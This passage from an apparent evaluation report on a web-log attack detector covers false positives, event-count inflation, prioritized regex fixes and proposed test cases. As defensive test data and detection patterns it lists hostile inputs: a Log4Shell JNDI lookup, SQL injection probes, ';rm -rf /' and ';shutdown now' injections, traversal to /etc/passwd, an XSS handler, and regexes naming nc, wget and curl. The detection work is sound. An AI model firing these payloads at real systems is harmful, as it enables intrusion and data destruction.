Why it is wrong: the rule fires on the *presence* of an absolute URL, with no host analysis. Public CDN links, OAuth `continue` URLs, checkout `return_url`s and docs `redirect`s are normal. Status 200 multiplies 7 × 1.25 = **8.75**, so routine navigation lands in CRITICAL. Four of four link-out lookalikes and 20 of 200 realistic benign requests were flagged by this rule alone. The genuine SSRF signals (`SSRF-003` loopback, `SSRF-004` RFC1918, `SSRF-005` metadata, `SSRF-009` internal host param) already exist at 7–9 and are not the problem.

Recommended: demote `SSRF-001` to severity 2–3 (“URL parameter with an absolute URL — informational”), remove the open-redirect-only names (`redirect`, `redirect_uri`, `next`, `return`, `return_url`, `returnurl`, `continue`, `goto`, `link`) into a separate low-severity open-redirect rule if desired, and let host-aware rules carry the high severities. This preserves detection of `?url=http://169.254.169.254/…` via `SSRF-005` while eliminating the critical-noise floor.

### FP-2 — `WEBSHELL-004`: any `?cmd=` value is a webshell (P0/P1)

```
$ thresh w2-benign-cmd-download.log --no-color --top 100
  Threats      1 suspicious events  ·  1 unique offending IPs
  #1   11.25  2026-11-12 10:00:00  203.0.113.10  Webshell  200
    ↳ GET /player?cmd=download
      Command parameter in request (WEBSHELL-004) · pattern shell_param in '/player?cmd=download'
```

`?cmd=play`, `?cmd=download` and `?cmd=add-to-cart` all fire at severity 9 (11.25 CRITICAL). This is a common UI parameter for media players and carts. In the 200-request benign log this rule alone produced 15 of 60 events and the top three ranks.

Recommended: require a command-looking value (one of the shell command names, a path, or shell metacharacters), or lower the base severity to 4–5 and let `WEBSHELL-001` (shell filename) / `WEBSHELL-002` (`eval(base64_decode`) / `WEBSHELL-005` (PHP sink) keep severity 9. A value allowlist of UI verbs is also acceptable as a suppression list.

### FP-3 — `RECON-008`: `/admin` on normal traffic (P2, accepted with caveat)

`/admin` GET 200 with a normal browser UA → `RECON-008`, score 3.75 MEDIUM. This is deliberate and low severity; a SOC can triage it. It matters at volume: 25 of 60 events in the 200-request benign log were reconnaissance (mostly `/admin`, `/admin/users`, `/wp-login.php`, `/graphql`, `/swagger-ui`). If the product is deployed on admin-heavy sites, add per-path baselining or a suppression list; otherwise leave as-is and document it.

### FP-4 — `BF-001`: 401 bursts on API endpoints (P1)

```
$ thresh w3-api-401-burst.log --no-color --top 5
  Threats      1 suspicious events  ·  1 unique offending IPs
  #1   7.00   2026-11-12 10:00:00  198.51.100.44  Brute Force  401
    ↳ GET /api/v1/orders/0
      Authentication brute force (BF-001) · 25 failed logins in 300s (peak window)
```

Any 401 counts as an auth failure regardless of path; a client with an expired token hitting 25 distinct API endpoints trips brute force at HIGH. Evidence also calls them “failed logins”, which is misleading.

Recommended: apply the `LOGIN_HINTS` path filter to 401 as well (or add a separate `AUTH-001` “authentication failure burst” at severity 4 for non-login paths), and change the evidence wording to “failed authentication responses”.

### FP-5 — `SCAN-001`: 403 bursts on static assets (P2)

40 distinct `/assets/private/N.jpg` 403s (signed-URL expiry / hotlink protection) → `SCAN-001`, score 5.00 MEDIUM. Enumeration detection is doing what it was told, but static-asset 403s are usually authorization policy, not scanning.

Recommended: exclude `.css .js .mjs .png .jpg .jpeg .gif .svg .webp .ico .woff .woff2 .map` paths from the distinct-path count (or from the rule entirely), and decouple the threshold as noted in FN-7.

### FP-6 — `SENS-015`: backup suffix on arbitrary query values (P3)

`/download?file=release-notes.old` → `SENS-015`, 5.00 MEDIUM. The custom check flags any query value ending in `.old`, `.tmp`, `.bak`, `.swp`, `~`, etc. Legitimate release artefacts often end in `.old`/`.tmp`.

Recommended: for query values, restrict to source/config extensions (`.php`, `.jsp`, `.asp`, `.aspx`, `.inc`, `.yml`, `.yaml`, `.json`, `.conf`, `.env`) or drop the query-value check to severity 2. Path-based backup detection (e.g. `/config.php.bak`) is high-signal and should stay.

### Informational low-severity hits (accepted)

| Path | Rule | Score | Comment |
|---|---|---|---|
| `/.well-known/security.txt` | `RECON-001` | 2.50 | deliberate probe, harmless |
| `/graphql` | `RECON-005` | 3.75 | normal API endpoint |
| `/swagger-ui/index.html` | `RECON-004` | 3.75 | docs surface |
| `/wp-login.php` | `RECON-009` | 3.75 | normal WordPress login |

These are acceptable if the SOC treats MEDIUM recon as inventory noise, but they contribute to the 30 % benign event rate. Consider a “known public surface” suppression mechanism.

---

## 6. Event-count inflation

The headline “Threats N suspicious events” counts **rule hits**, not requests. 57 attack requests produced 136 events (mean 2.39; max 8 on `/?file=..%2f..%2f..%2fproc%2fself%2fenviron`, which trips five traversal rules, three LFI rules). The demo log similarly reports 379 events for what is a much smaller set of malicious requests. Because TOP THREATS deduplicates per request, the headline and the list disagree (6 vs 1 for `trav-01`).

This is not a detection bug, but it distorts capacity planning, severity counts (six CRITICAL for one request) and SOC metrics. Suggested: add “unique offending requests” next to the event count, or cap contributing rules per line for headline purposes; keep the per-rule detail in the evidence.

---

## 7. Prioritized fixes

| Priority | Rule / file | Change | Expected effect |
|---|---|---|---|
| **P0** | `SSRF-001` (`src/detection/ssrf.rs`) | Demote to severity 2–3; remove `redirect/next/return/return_url/continue/goto/link` to a separate open-redirect rule; keep host-aware `SSRF-003/004/005/009` at 7–9 | Removes the 8.75-CRITICAL public-URL false positives (4/20 benign, 20/200 realistic) without losing metadata/loopback detection |
| **P0** | `LOG4SHELL-004/006` (`src/detection/log4shell.rs`) | Add `\$\{[^}]*\}\s*(?:j?ndi):(?:ldap\|rmi\|dns\|http\|https\|iiop)` (sev 10) and `\$\{\$\{` (sev 9); optionally deobfuscate `${lower:X}`/`${env:*:-X}` before matching | Catches `${${lower:j}ndi:…}` (currently 0 events) |
| **P1** | `SQLI-*` (`src/detection/sqli.rs`) | Add a comment-stripped normalisation view; add `\b\d+\s*(?:--\|#)` and `\b\d+\s+(?:or\|and)\s+\d+\s*=\s*\d+` (sev 4) and numeric quote `[?&][a-z0-9_.-]+=\d+'` (sev 3) | Closes `1'`, `1--`, `1#`, `2=2`, `/**/`, `/*!…*/` (6 probes currently 0 events) |
| **P1** | Scope design (`src/detection/rule.rs`, new header rules) | Add UA/Referer rules for SQLi (sev 6), traversal (sev 6), XSS (sev 4) | Closes FN-3 without re-running full target scope |
| **P1** | `CMDI-001` (`src/detection/cmdi.rs`) | Extend command alternation with `rm\|mv\|cp\|dd\|mkfifo\|kill\|pkill\|shutdown\|reboot\|telnet\|ssh\|scp\|ftp\|tftp\|base64\|xxd\|socat\|chmod\|chown\|tar\|find\|xargs` | Catches `;rm`, `;shutdown`, `;telnet` (3 probes currently 0 events) |
| **P1** | `WEBSHELL-004` (`src/detection/webshell.rs`) | Require command-looking value (`id\|whoami\|uname\|ls\|cat\|wget\|curl\|nc\|bash\|sh\|cmd…`) or drop severity to 5; keep shell-filename/sink rules at 9 | Removes 11.25 CRITICAL `?cmd=download`/`?cmd=add-to-cart` noise |
| **P1** | `SCAN-001` (`src/detection/bruteforce.rs`) | Decouple: add `--scan-threshold` default 25 (or document effective 40); exclude static asset extensions from distinct-path counting | Makes 30-path scans work at defaults and stops 403-asset FPs |
| **P1** | `BF-001` (`src/detection/bruteforce.rs`) | Apply login-path hints to 401, or split non-login 401 bursts into low-severity `AUTH-001`; rename evidence “failed authentication responses” | Stops expired-token API clients producing HIGH brute-force events |
| **P2** | `TRAV-*` (`src/detection/traversal.rs`) | Add `\.\.;` (sev 6) and raw `%c0%ae\|%c0%af\|%c1%9c` (sev 6) | Catches `..;/` and overlong UTF-8 traversal |
| **P2** | `XSS-004` (`src/detection/xss.rs`) | Extend handler list with `pointerdown\|pointerup\|pointermove\|touchmove\|animationiteration\|transitionrun\|beforetoggle` | Catches `ontouchmove`/plain `onpointerdown` |
| **P2** | `RECON-008` | Keep severity 3, add documentation/suppression guidance for admin-heavy sites | Reduces volume without changing detection |
| **P3** | `SENS-015` (`src/detection/sensitive.rs`) | Restrict query-value backup detection to source/config extensions or lower to sev 2 | Removes `release-notes.old` false positive |
| **P3** | Reporting (`src/main.rs`, dashboard) | Add “unique offending requests” alongside event count | Makes the headline match the deduplicated TOP THREATS list |
| **P3** | Rule inventory | 119 IDs compiled; `RECON-013` missing. If 126 is intended, restore/renumber or correct the documentation | Prevents rule-count drift between docs and code |

---

## 8. Validation recommendations (tests to add later)

These would lock in the findings without changing current behaviour:

- Positive: `${${lower:j}ndi:ldap://x}`, `${${env:NaN:-j}ndi:ldap://x}`, `?id=1'`, `?id=1--`, `?id=1 OR 2=2`, `UN/**/ION SEL/**/ECT`, `/*!50000UNION*/ SELECT`, `;rm -rf /`, `;shutdown now`, `?x=<div ontouchmove=alert(1)>`, `/..;/..;/config.php`, `/..%c0%af..%c0%afetc/passwd`.
- Negative: `?next=https://shop.example.com/checkout`, `?return_url=https://shop.example.com/account`, `?redirect=https://docs.example.com/start`, `?url=https://cdn.example.com/image.png`, `/player?cmd=download`, `/cart?cmd=add-to-cart`, `/download?file=release-notes.old`, 40 distinct 403 static assets, 25 distinct 401 API endpoints.
- Calibration: 30 distinct 404 paths at default settings must either fire or be documented as requiring 40; 24 at `--threshold 5` must not fire.

---

## 9. Limitations

- Payloads are hand-crafted and adversarially biased; rates describe this corpus, not production prevalence.
- Single-line isolation removes cross-request context except in the dedicated correlation scenarios; scoring boosts therefore reflect one IP/one line, not realistic bursts.
- TOP THREATS deduplicates per request, so full per-rule attribution for multi-hit lines is inferred from category counts and the rule regexes rather than printed directly.
- No rebuild was performed (read-only); the binary under test was built from the current tree at 12:09. A static scan of `src/detection` finds 119 IDs versus the 126 cited in the brief.
- Parser robustness was spot-checked (bad protocol → `MALF-001`, malformed method → `MALF-002`, 5 000-byte target → `MALF-004`, vhost and JSON variants), not fuzzed.
- Sanity baseline: `demo/access-demo.log` (112 MiB, 600 219 lines) scanned in 535 ms (1.12 M lines/s) with 379 events from 9 IPs — throughput and aggregation behave as documented.
